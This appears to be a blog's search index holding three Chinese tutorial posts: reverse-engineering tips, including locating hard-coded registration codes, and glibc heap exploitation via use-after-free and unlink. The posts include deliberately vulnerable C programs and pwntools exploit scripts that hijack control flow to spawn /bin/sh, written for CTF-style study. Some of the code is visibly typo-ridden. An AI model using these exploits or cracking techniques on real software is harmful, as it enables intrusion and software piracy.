<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>逆向工程小知识</title>
      <link href="/2019/08/02/ni-xiang-gong-cheng-xiao-zhi-shi/"/>
      <url>/2019/08/02/ni-xiang-gong-cheng-xiao-zhi-shi/</url>
      
        <content type="html"><![CDATA[<p>在VB中：<br><strong>vbaVarForInit() , </strong>vbaVarForNext() 可以使逆向分析人员在字符串对象中逐个引用字符。 后面可以跟loop count (EBX) 使其按指定次数运转循环</p><pre><code>MSVBVM50.rtcMsgBox  \\调用消息框</code></pre><p>入口点：<br>    调试器载入程序后停止的地方为入口点，它是一段EP（EntryPoint，入口点）代码，其中最引人注意的是CALL 和 JMP 两个命令<br><img src="/2019/08/02/ni-xiang-gong-cheng-xiao-zhi-shi/1.png" title="This is an image"><br>EP:<br>    EP是windows可执行文件（EXE,DLL,SYS等）的代码入口点，是执行应用程序时最先执行的代码的起始位置，它依赖于CPU</p><p>查找main函数的方法：<br>    简单有效：F7,F8查看函数 （一些经验就是可以通过注释区的注释直接步过一些函数列如一些winAPI）</p><p>大本营：<br>    为了重复加载程序方便，我们可以在一些地方下断点防止一些麻烦（就比如不用一次次的找main函数）</p><ol><li>GOTO 命令（Ctrl+G）然后 F4</li><li>设置断点</li><li>加上注释（快捷键 ; ）</li><li>加上标签 （快捷键 : ）</li></ol><p>快速查找指定代码的四种方法：    </p><ol><li>代码执行法</li><li>字符串检索法</li><li>API检索法（1）：程序没有压缩器/保护器的保护  用All intermodular calls 生成API函数列表</li><li>API检索法（2）：存在（1）中情况   此时DLL代码库被加载到内存后，我们可以直接向DLL库中添加断点 （快捷键Alt + M 打开内存映射窗口可以查看一些进程内存和USER32库的加载情况），同时 Name in all modules可以列出所被加载的DLL文件中提供的API</li></ol><p>函数调用约定：<br>  cdecl:<br>    调用者直接清理其压入栈的函数参数<br>   stdcall:<br>    一个使用例子</p><pre><code>#include &quot;stdio.h&quot;int _stdcall add(int a ,int b){    return a+b;}int main(){    return add(1,2);}</code></pre><p>  这种方式是用被调用函数自己清理栈，其汇编结尾 一般用 RETN+一个数字（栈大小）<br>  fastcall:<br>  与stdcall方式基本相似，但是该方式通过使用寄存器（而非栈内存）去传递那些需要传递给函数的部分参数（前两个）一般为ECX,EDX</p><ul><li>逆向工程中函数调用的返回值一般保存在eax中，在程序call指令之后一般就会有对eax寄存器的处理，这一点可以用来判断函数的用途和结构</li><li><p>.逆向工程中确定函数参数多少的方法：</p><pre><code>进入函数后可以看到它栈空间中存储的返回地址，通过该返回地址你可以找到调用该函数的起始地址，然后可以分析在进入函数体前后的栈空间大小来确定参数多少</code></pre></li><li><p>一些逆向可能会直接在程序内部存在注册码，可以通过找到注册码错误的字符串确定比较注册码正确与否的函数，而在改函数的附近一般会存在正确的注册码。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>glibc heap UAF</title>
      <link href="/2019/08/02/glibc-heap-uaf/"/>
      <url>/2019/08/02/glibc-heap-uaf/</url>
      
        <content type="html"><![CDATA[<p>use after free（UAF）</p><ul><li>重新malloc一样的大小，会拿到曾经Free的chunk，此时就会有两个指针p，和q指向同一个内存块，使用这两个的指针操作混在一起（之前的哪个指针在chun被free后没有被置为NULL，形成悬空指针）</li><li>还有一个小点就是要注意在64bits的时候有可能会出现高位的\x00截断这种事情</li><li>这个关键的一点就是free掉的内存块，还是可以再次拿出来用的，就想之前free的chunk，malloc的也可以再次拿出来，我们看一个例子</li></ul><pre><code>#include&lt;stdio.h&gt;#include&lt;cstdlib&gt;#include&lt;cstring&gt;class A{    public:        virtual void print()        {            puts(&quot;class A&quot;);        }};class B:public A{    public:        void print(){            puts(&quot;class B&quot;);        }};void sh(){    system(&quot;sh&quot;);}char buf[1024];int main(){    setvbuf(stdout,0,_IONBF,0);   \\这个setvbuf是C库函数，作用跟参数有关，可以百度一下，目前的作用是    A *p = new B();    delete p;    fgets(buf,sizeof(buf),stdin);    char *q = strdup(buf);   \\这个其实就是有一个malloc分配内存块然后把字符串打印进去    p-&gt;print();}</code></pre><p>然后就要分析一下这个源码，首先看一下strdup的源码，这个函数定义在string.h这个头文件之中，</p><pre><code>char * __strdup(const char *s){   size_t  len = strlen(s) +1;   void *new = malloc(len);   if (new == NULL)      return NULL;   return (char *)memecpy(new,s,len);}</code></pre><p>那么我们开始走程序，我们在delete p下断点执行程序，然后看ida先分析一下，<br><img src="/2019/08/02/glibc-heap-uaf/1.png" title="This is an image"><br>我们可以看到申请了是8bit的内存空间，但是对齐到最后应该会生成一个32位大小的堆块，进GDB<br><img src="/2019/08/02/glibc-heap-uaf/2.png" title="This is an image"><br>我们看到分配的mem在rax里面，而且目前mem刚申请出来，还都是0，其实也可以看到，下面有一个清0的操作，下面来个图带解释<br><img src="/2019/08/02/glibc-heap-uaf/3.png" title="This is an image"><br>call B之后内存块是这样的<br><img src="/2019/08/02/glibc-heap-uaf/4.png" title="This is an image"><br>然后紧接着的delete就给全清0了<br><img src="/2019/08/02/glibc-heap-uaf/5.png" title="This is an image"><br>然后紧接着fgets 输入8个a ，输入到了0x601160这个bss段，然后就指向strdup函数，然后把bss段的东西读入到新申请的mem<br><img src="/2019/08/02/glibc-heap-uaf/6.png" title="This is an image"><br>这时候我们惊喜的发现我们之前的chunk被拿出来用了，被填上了我们的输入，那么因为之前那个指针p没有被置为NULL,所以它还是指向这里的，我们可以利用此来劫持函数流，因为源代码的下面,还可以看看ida里面，有一个p的调用：<br><img src="/2019/08/02/glibc-heap-uaf/7.png" title="This is an image"><br>接下来利用过程就很关键了：<br><img src="/2019/08/02/glibc-heap-uaf/8.png" title="This is an image"><br>我们就可以开做题了：</p><pre><code>#coding:utf-8from pwn import *r = process(&#39;./use-after-free&#39;)buf = 0x601160system_sh = 0x000000000400906r.sendline(p64(buf+8)+p64(system_sh))     #这个送过去的数据不能太大，太大的话就不会申请的原来的chunk,如果想要刚刚好的话是24byte,不过这个不用刚刚好，因为chunk补齐，chunk的最小刚好是32byte,+8是因为对输入的地址要进行解引用的，可以看细看解析的最后一部分r.interactive()</code></pre><p>下面这个是个32位的例子，来自安全客，看题目源码：</p><pre><code>#include&lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef void (*func_ptr)(char *);   //定义了一个函数指针，参数类型char *,没有返回值void evil_fuc(char command[]){    system(command);}void echo(char content[]){    printf(&quot;%s&quot;,content);}int main(){    func_ptr *p1=(int*)malloc(4*sizeof(int));    printf(&quot;malloc addr: %pn&quot;,p1);    p1[3]=echo;   //这个代表的是分配出来的内存块的第四个    p1[3](&quot;hello worldn&quot;);    free(p1); //在这里free了p1,但并未将p1置空,导致后续可以再使用p1指针    p1[3](&quot;hello againn&quot;); //p1指针未被置空,虽然free了,但仍可使用.    func_ptr *p2=(int*)malloc(4*sizeof(int));//malloc在free一块内存后,再次申请同样大小的指针会把刚刚释放的内存分配出来.    printf(&quot;malloc addr: %pn&quot;,p2);    printf(&quot;malloc addr: %pn&quot;,p1);//p2与p1指针指向的内存为同一地址    p2[3]=evil_fuc; //在这里将p1指针里面保存的echo函数指针覆盖成为了evil_func指针.    p1[3](&quot;whoami&quot;);   //p1这个指针跟先前的操作一样，本来是要传个参数给echo，但是因为被p2改成evil_fuc,参数就给了evil,当然这里换成p2也可以的    return 0;}</code></pre>]]></content>
      
      
      <categories>
          
          <category> 漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>glibc heap unlink漏洞</title>
      <link href="/2019/08/02/glibc-heap-unlink-lou-dong/"/>
      <url>/2019/08/02/glibc-heap-unlink-lou-dong/</url>
      
        <content type="html"><![CDATA[<p>知识点：</p><ol><li>free操作会检查前后相邻堆块是否in_use，空闲的话就会进行合并操作</li><li>空闲的堆块一般以双向链表的形式存在（fastbin是单向链表不适用此种攻击）</li><li>unlink : 如果刚释放的堆块要与前面或者后面的堆块进行合并操作，那么需要把前面或者后面的堆块从双向链表中摘取下来，合成更大的堆块插入到别的bin之中，将空闲堆块从bin里面摘取下来的操作就是unlink</li><li>chunk中的flag标志位 ： flag来源 ，size字节需要8字节对齐，就会空余出来3个bit, 其中最低位表示前一个chunk是否在使用，倒数第二位表示这个chunk是否通过mmap的方式产生，第三个表示 该chunk是否属于一个线程的arena</li><li>fd : 指向下一个空闲的chunk，bk指向上一个空闲的chunk</li><li>下面是一个往前合并的源码 ：值得注意的就是free在unlink的时候是先进行backward 然后 forward<pre><code>             /* consolidate backward 往前合并*/            if (!prev_inuse(p)) {     //先检查要free chunk的上一个chunk是不是 in_use，不是的话就往下操作                    prevsize = prev_size(p);   //取p的前一个chunk的size（利用的是p chunk的prev_size）                    size += prevsize;    //free_chunk的size + 上一个chunk的size                    p = chunk_at_offset(p, -((long)prevsize));  //p指向上一个chunk的开始处                     if (__glibc_unlikely(chunksize(p) != prevsize))   //然后这个应该是检查prev_size对不对，利用的是前后改变的chunk的size大小跟prev_size是不是相等                           malloc_printerr(&quot;corrupted size vs. prev_size while  consolidating&quot;);                    unlink(av, p, bck, fwd);   //这个就是我们要利用的地方了，下面有详解            }</code></pre></li><li>同时我截取_int_free的一段源码进行解析：<pre><code>_int_free(mstate av, mchunkptr p, int have_lock)  //这是它的参数 av是指向main_arena , p是指向要free的chunk{if (__builtin_expect((uintptr_t)p &gt; (uintptr_t)-size, 0)   //这个是检查pointer是否合法if (__glibc_unlikely(size &lt; MINSIZE || !aligned_OK(size)))  //这个检查chunk的size是否合法if ((unsigned long)(size) &lt;= (unsigned long)(get_max_fast())  //还要检查是否属于fastbin 因为fastbin free的时候有自己的方式else if (!chunk_is_mmapped(p))  //上面那个检查通过后直接跳到这里，检查是否是mmap出来的chunk}</code></pre>8.最重要的就是合并时候的操作： 看6.<br>9.然后就是unlink了：<pre><code>#!c  /*这个unlink函数实际上是很长的，我下面截取关键部分/*malloc.c  int_free函数中*//* consolidate backward */if (!prev_inuse(p)) {  prevsize = p-&gt;prev_size;size += prevsize;  p = chunk_at_offset(p, -((long) prevsize));  unlink(p, bck, fwd);}   /*这一部分前面讲过了*///相关函数说明：/* Treat space at ptr + offset as a chunk */#define chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))/*unlink操作的实质就是：将P所指向的chunk从双向链表中移除，这里BK与FD用作临时变量*/#define unlink(P, BK, FD) {                                            \FD = P-&gt;fd;                                   //我们看这里，此时的P其实指向的当前要free的chunk的前一个chunk了，它还在bin里面，我们首先要把它从bin里面拿出来BK = P-&gt;bk;                                   \FD-&gt;bk = BK;                                  \BK-&gt;fd = FD;                                  //这几部下来就把chunk拿出来了（其实就是拿出来，然后前后连起来）...     //后面又是一顿操作，把合并的chunk给放到新的bin里面}</code></pre>10.我们说一下如何利用：</li></ol><ul><li>如果有heap overflow可以覆盖到某一个chunk q 的prev_size. 那么free q 时传入unlink（p）的 p 就可以控制</li><li>使得chunk p的内容可以被控制</li><li>FD = P -&gt; fd ; BK = P -&gt; bk ;  我们可以使得 PK = P -&gt; fd = <a href="mailto:free@got.plt" target="_blank" rel="noopener">free@got.plt</a> - 0x18 （这就是的PK的bk处被写成了<a href="mailto:free@got.plt" target="_blank" rel="noopener">free@got.plt</a>） , BK = P -&gt; bk = shellcode ,那么free @got.plt就会被写入成为shellcode</li><li>但是，BK-&gt;fd = FD 那么你之前写入的shellcode的第16个bit开始会被改成 <a href="mailto:free@got.plt" target="_blank" rel="noopener">free@got.plt</a> - 0x18  ，针对这个其实我们就可以开头插入一个jmp去跳过它</li></ul><p>一个实验用的（这里是32位的，大致跟64位利用相同）</p><pre><code>#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main( int argc, char * argv[] ){        char * first, * second;/*[1]*/ first = malloc( 666 );/*[2]*/ second = malloc( 12 );        if(argc!=1)/*[3]*/         strcpy( first, argv[1] );/*[4]*/ free( first );/*[5]*/ free( second );/*[6]*/ return( 0 );}</code></pre><p>在所有的malloc执行完之后：<br><img src="/2019/08/02/glibc-heap-unlink-lou-dong/1.png" title="This is an image"><br>unlink源码分析：</p><p>先后合并（把当前chunk的前一个chunk和当前chunk合并）</p><pre><code>#!c  /*这个unlink函数实际上是很长的，我下面截取关键部分    /*malloc.c  int_free函数中*//* consolidate backward */    if (!prev_inuse(p)) {      prevsize = p-&gt;prev_size;size += prevsize;      p = chunk_at_offset(p, -((long) prevsize));      unlink(p, bck, fwd);}   /*这一部分前面讲过了*///相关函数说明：/* Treat space at ptr + offset as a chunk */#define chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))/*unlink操作的实质就是：将P所指向的chunk从双向链表中移除，这里BK与FD用作临时变量*/#define unlink(P, BK, FD) {                                            \    FD = P-&gt;fd;                                   //我们看这里，此时的P其实指向的当前要free的chunk的前一个chunk了，它还在bin里面，我们首先要把它从bin里面拿出来    BK = P-&gt;bk;                                       FD-&gt;bk = BK;                                      BK-&gt;fd = FD;                                  //这几部下来就把chunk拿出来了（其实就是拿出来，然后前后连起来）    ...     //后面又是一顿操作，把合并的chunk给放到新的bin里面}</code></pre><p>malloc第一个chunk的prev_inuse标志一直都是1 虽然它事实上不存在<br>向前合并（forward） ：<br>检查next chunk是否处于free状态，我们回去检查next next chunk的prev_inuse标志位是否为1，下面是源码：</p><pre><code>#!c……/*这里p指向当前chunk*/nextchunk = chunk_at_offset(p, size);……nextsize = chunksize(nextchunk);……if (nextchunk != av-&gt;top) {      /* get and clear inuse bit */      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);//判断nextchunk是否为free chunk      /* consolidate forward */      if (!nextinuse) { //next chunk为free chunk            unlink(nextchunk, bck, fwd); //将nextchunk从链表中移除          size += nextsize; // p还是指向当前chunk只是当前chunk的size扩大了，这就是向前合并！      } else            clear_inuse_bit_at_offset(nextchunk, 0);          ……    }</code></pre><p>在这个例子中next next chunk 就是top chunk，那么top chunk 的prev_inuse始终为1 ，所以也不会进行向前合并，但是我们可以利用堆溢出伪造，不过，我们还要了解一下合并后或者不满足条件没合并的chunk会怎么办：glibc malloc中会把他们放到unsorted bin之中</p><pre><code>#!c/*Place the chunk in unsorted chunk list. Chunks are not placed into regular bins until after they have been given one chance to be used in malloc.*/  bck = unsorted_chunks(av); //获取unsorted bin的第一个chunk/*  /* The otherwise unindexable 1-bin is used to hold unsorted chunks. */    #define unsorted_chunks(M)          (bin_at (M, 1))*/      fwd = bck-&gt;fd;      ……      p-&gt;fd = fwd;      p-&gt;bk = bck;      if (!in_smallbin_range(size))        {          p-&gt;fd_nextsize = NULL;          p-&gt;bk_nextsize = NULL;        }      bck-&gt;fd = p;      fwd-&gt;bk = p;        set_head(p, size | PREV_INUSE);//设置当前chunk的size,并将前一个chunk标记为已使用set_foot(p, size);//将后一个chunk的prev_size设置为当前chunk的size/*   /* Set size/use field */   #define set_head(p, s)       ((p)-&gt;size = (s))   /* Set size at footer (only when chunk is not in use) */   #define set_foot(p, s)       (((mchunkptr) ((char *) (p) + (s)))-&gt;prev_size = (s))*/</code></pre><p>上面基本就是说，free后的chunk插入到unsorted chunk的第一个chunk(这个其实是bin)与下一个chunk（这个才是真正可用的第一个chunk）的中间当做表头，然后通过设置自己的size字段来表示前一个chunk可用，然后更改next chunk的prev_size为改chunk的大小，<br>但是本例中的chunk second没被放入unsort bin，而是放入了fastbin.<br>下面我们可以精心布置chunk second来实现攻击：<br>1.我们要修改chunk second 的chunk header</p><ul><li>任意数</li><li>size = -4  -4 = 11111100  //这个主要是控制prev_inuse 位</li><li>fd = free函数的got表地址-12</li><li>bk = shellcode的地址</li></ul><p>这样程序在继续运行得话如果free(first) , 我们要考虑是否合并，首先肯定不会向后合并，那就考虑向后合并，glibc通过chunk second 的size + chunk second 的prev_size 来确定next next chunk，那么现在size是-4，那么现在next_chunk，被当做next next chunk，因为size = -4所以next_chunk被当做free的，然后出发unlink，进行合并操作，</p><pre><code>BK=second-&gt;bk（在例子中bk实际上是shellcode的地址）FD=second-&gt;fd (在例子中fd实际上是free@got的地址 - 12)FD-&gt;bk=BK/*shellcode被写进了FD+12的位置，但是FD是free@got的地址-12，所以实际上我们已经把shellcode地址写入了free@got*/BK-&gt;fd=FD</code></pre><p>可是新的glibc增加了保护机制防止unlink,但是仍然可以绕过，下面同用于64和32位,但是例子是64位的：<br>检查源码：</p><pre><code>#define unlink(P, BK, FD) {                                                FD = P-&gt;fd;                             BK = P-&gt;bk;       if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))       //具体就是说在进行unlink操作之前，会先检查当前chunk的prev_chunk的fd和next_chunk的bk是不是当前chunk。            malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P);                                      FD-&gt;bk = BK;                                      BK-&gt;fd = FD;                                   ...     }</code></pre><p>overwrite Heap Pointer 利用条件:</p><ul><li>有一个指针指向heap</li><li>存放改指针的地址已知（比如改指针是全局变量）</li><li>可以对改指针多次写入 </li></ul><p>那么我们就可以构造下面来越过检查：</p><ul><li>p -&gt; fd = &amp;p - 0x18</li><li>p -&gt; bk = &amp;p - 0x10</li><li>接着源码继续进行 ， FD -&gt; bk = BK ; BK - &gt; fd = FD; </li><li>上述完成后我们得到的结果是 ： p = &amp;p - 0x18 </li></ul><p>引入一个例题（这个例题可以用来解释，但是实际操作的时候呢，程序会因为stdout,stdin，生成chunk 夹在中间，使得程序利用难以实现），不过重要的是思路：</p><pre><code>#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;#include&lt;unistd.h&gt;char *cmd;void sh(char *c){    system(c);}int main(){    char *ptr[8];    int size;    int n;    setvbuf(stdout,0,_IONBF,0);    memset(ptr,0,sizeof(ptr));    cmd = malloc(128);    //这里有一个地址已知的全局变量指针，还指向了heap , 而且下面的fgets可以实现对改指针的多次写入    while(1)    {        fgets(cmd,128,stdin);        if(!strncmp(cmd,&quot;add&quot;,3))        {            printf(&quot;Index: &quot;);            scanf(&quot;%d&quot;,&amp;n);            if(n&gt;=0 &amp;&amp; n&lt;8)            {                printf(&quot;Size: &quot;);                scanf(&quot;%d%*c&quot;,&amp;size);                ptr[n] = malloc(size);                printf(&quot;Data: &quot;);                gets(ptr[n]);            }            else            {                puts(&quot;out of bound&quot;);            }        }        else if(!strncmp(cmd,&quot;renove&quot;,6))        {            printf(&quot;Index: &quot;);            scanf(&quot;%d%*c&quot;,&amp;n);            if(n&gt;=0 &amp;&amp; n&lt;8 &amp;&amp; ptr[n])            {                puts(ptr[n]);                free(ptr[n]);                ptr[n] = 0;            }            else            {                puts(&quot;nothing here&quot;);            }        }        else        {            puts(&quot;unkonw command&quot;);        }    }    return 0;}</code></pre><p>下面我们先给出脚本来方便分析</p><pre><code>#coding:utf-8from pwn import *context.log_level = &quot;debug&quot;r = remote(&#39;0.0.0.0&#39;,4000)#r = process(&#39;./unlink2&#39;)elf = ELF(&#39;unlink3&#39;)malloc_got = elf.got[&#39;malloc&#39;]sh_addr = 0x0000000004008A9def malloc(idx,size,data):    r.sendline(&#39;add&#39; + &#39;0&#39;*5 + p64(0x100) + p64(0x0000000006010B0-0x18)+p64(0x0000000006010B0-0x10))    3这里就在于构造FD的fd 和 bk 用于躲过检查    r.sendline(str(idx))    r.sendline(str(size))    r.sendline(str(data))def free(idx):    r.sendline(&#39;renove&#39;)    r.sendline(str(idx))malloc(0,130,&#39;aaaaaaaa&#39;)malloc(1,130,&#39;bbbbbbbb&#39;)free(0)malloc(2,130, 0x80 * &#39;a&#39; + p64(0x1120) + p64(0x90))  #利用heap overflow 改变下一个chunk的prev_size 和 sizefree(1)   #之后&amp;cmd = 0x0000000006010B0 - 0x18 ,这里要注意的是不是free(2),因为上一步改了size位，所以2相当于还是free着呢，所以free(2),会触碰double free检查payload1 = &#39;a&#39; * 0x18 + p64(malloc_got)  //这是的cmd指针 已经被修改了 ， 我们通过fget 可以使得cmd 再次被改为 malloc@got.pltr.sendline(payload1)payload2 = p64(sh_addr) + &#39;;/bin/sh\x00&#39;   //这里就是构造sh函数  ， 可能参数写错了  r.sendline(payload2)r.interactive()</code></pre>]]></content>
      
      
      <categories>
          
          <category> 漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
